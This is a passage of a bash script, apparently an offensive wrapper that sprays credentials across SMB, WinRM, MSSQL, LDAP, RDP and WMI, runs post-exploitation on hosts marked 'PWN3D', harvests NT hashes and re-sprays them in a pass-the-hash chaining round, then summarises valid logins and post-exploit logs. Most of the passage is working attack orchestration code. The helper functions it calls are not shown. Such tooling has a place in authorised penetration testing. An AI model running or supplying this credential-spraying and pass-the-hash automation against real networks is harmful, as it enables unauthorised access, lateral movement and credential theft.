        elif grep -aq 'TIMEOUT' "$log_file" 2>/dev/null; then
            _RES[$proto]="TIMEOUT"
        else
            _RES[$proto]="-"
        fi
        _HIT[$proto]="$hits"

        if [[ $POST -eq 1 && ( "${_RES[$proto]}" == "PWN3D" || "${_RES[$proto]}" == "VALID" ) ]]; then
            run_postexploit "$proto" "$log_file" "$base"
        fi

        if [[ $PAUSE_REQ -eq 1 && $ABORT -eq 0 ]]; then
            PAUSE_REQ=0
            warn "paused after $proto - press any key to resume..."
            [[ $INTERACTIVE -eq 1 ]] && read -rsn1 < /dev/tty
        fi
    done
}

# --- main: primary round ---------------------------------------------------
declare -A RESULT=() HITS=()
run_started=$(date +%s)

run_all_protocols "$RUNDIR" RESULT HITS SELECTED

# --- pass-the-hash chaining round (opt-in via --pth-chain) -----------------
declare -A CRES=() CHIT=()
declare -a CHAIN_PROTOS=()
CHAINED=0
if [[ $PTH_CHAIN -eq 1 && $ABORT -eq 0 ]]; then
    mapfile -t PTH_CREDS < <(harvest_pth_creds)
    if [[ ${#PTH_CREDS[@]} -eq 0 ]]; then
        warn "pth-chain: no new NT hashes harvested from --post output"
    else
        # only re-spray auth-capable protocols that were in the original scope
        for proto in "${SELECTED[@]}"; do
            case "$proto" in smb|winrm|mssql|ldap|rdp|wmi) CHAIN_PROTOS+=("$proto") ;; esac
        done
        if [[ ${#CHAIN_PROTOS[@]} -eq 0 ]]; then
            warn "pth-chain: no auth-capable protocols in scope to re-spray"
        else
            CHAINED=1
            ok "pth-chain: harvested ${#PTH_CREDS[@]} hash(es) - re-spraying: ${CHAIN_PROTOS[*]}"
            CREDS=("${PTH_CREDS[@]}")     # summary scans log files, not CREDS
            run_all_protocols "$RUNDIR/chain" CRES CHIT CHAIN_PROTOS
        fi
    fi
fi

# --- summary ---------------------------------------------------------------
elapsed=$(( $(date +%s) - run_started ))
summary="$RUNDIR/summary.txt"

emit_summary() {
    printf '%s========================  SUMMARY  ========================%s\n' "$C_BOLD" "$C_RESET"
    printf '%-8s %-9s %-5s %s\n' "PROTOCOL" "RESULT" "HITS" "LOG"
    printf -- '---------------------------------------------------------\n'
    local proto st hc colour
    for proto in "${SELECTED[@]}"; do
        st="${RESULT[$proto]:-skipped}"; hc="${HITS[$proto]:-0}"
        [[ $ONLY_SUCCESS -eq 1 && "$st" != "PWN3D" && "$st" != "VALID" ]] && continue
        case "$st" in
            PWN3D)   colour="$C_GREEN" ;;
            VALID)   colour="$C_GREEN" ;;
            TIMEOUT) colour="$C_YELLOW" ;;
            SKIP)    colour="$C_YELLOW" ;;
            NOHOST)  colour="$C_YELLOW" ;;
            *)       colour="$C_RESET" ;;
        esac
        printf '%-8s %s%-9s%s %-5s %s\n' \
            "$proto" "$colour" "$st" "$C_RESET" "$hc" "${proto}.log"
    done
    # pass-the-hash chaining round
    if [[ $CHAINED -eq 1 ]]; then
        printf -- '------------------  PtH-CHAIN (round 2)  ----------------\n'
        local cp cst chc
        for cp in "${CHAIN_PROTOS[@]}"; do
            cst="${CRES[$cp]:-skipped}"; chc="${CHIT[$cp]:-0}"
            [[ $ONLY_SUCCESS -eq 1 && "$cst" != "PWN3D" && "$cst" != "VALID" ]] && continue
            case "$cst" in
                PWN3D|VALID) colour="$C_GREEN" ;;
                TIMEOUT|SKIP|NOHOST) colour="$C_YELLOW" ;;
                *) colour="$C_RESET" ;;
            esac
            printf '%-8s %s%-9s%s %-5s %s\n' \
                "$cp" "$colour" "$cst" "$C_RESET" "$chc" "chain/${cp}.log"
        done
    fi
    echo
    # valid credential detail lines (primary + chain)
    local any=0 proto lf lines tag
    for proto in "${SELECTED[@]}"; do
        for tag in "" "chain/"; do
            lf="$RUNDIR/${tag}${proto}.log"
            [[ -f "$lf" ]] || continue
            lines=$(grep -aE '\[\+\]' "$lf" 2>/dev/null | strip_ansi | sort -u)
            if [[ -n "$lines" ]]; then
                any=1
                printf '%s[%s%s valid logins]%s\n' "$C_GREEN" "${tag:+PtH }" "$proto" "$C_RESET"
                printf '%s\n' "$lines" | sed 's/^/    /'
            fi
        done
    done
    [[ $any -eq 0 ]] && printf '%sNo valid logins recorded.%s\n' "$C_YELLOW" "$C_RESET"
    local pglob
    for pglob in "$RUNDIR/postexploit" "$RUNDIR/chain/postexploit"; do
        if [[ -d "$pglob" ]] && compgen -G "$pglob/*.log" >/dev/null; then
            echo
            printf '%s[post-exploit logs%s]%s\n' "$C_GREEN" "${pglob##$RUNDIR}" "$C_RESET"
            printf '    %s\n' "$pglob"/*.log
        fi
    done
    echo
    printf 'Completed in %ss. Full logs: %s\n' "$elapsed" "$RUNDIR"
}

echo
emit_summary
# plain copy without colours to disk
emit_summary | strip_ansi > "$summary" 2>/dev/null
ok "summary saved to $summary"
warn "grep all hits fast:  grep -riaE '\\[\\+\\]|Pwn3d!' $RUNDIR"
